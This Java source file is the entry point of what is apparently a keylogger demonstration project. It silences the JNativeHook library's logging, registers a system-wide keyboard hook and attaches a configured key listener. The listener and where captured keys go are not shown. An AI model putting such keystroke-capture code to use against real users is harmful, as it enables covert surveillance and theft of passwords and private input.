package com.suchocki.keyloggerdemo.main;

import java.util.logging.Level;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import com.suchocki.keyloggerdemo.config.KeyLoggerConfiguration;
import com.suchocki.keyloggerdemo.config.MainConfigProvider;

public class MainKeyLogger {

	private static Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());

	
	public static void main(String[] args) {
		logger.setLevel(Level.OFF);
		KeyLoggerConfiguration config = MainConfigProvider.getConfig();
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			System.err.println("Unable to start app properly");
			e.printStackTrace();
			System.exit(1);
		}
		GlobalScreen.addNativeKeyListener(config.getKeyListener());
		
	}

}
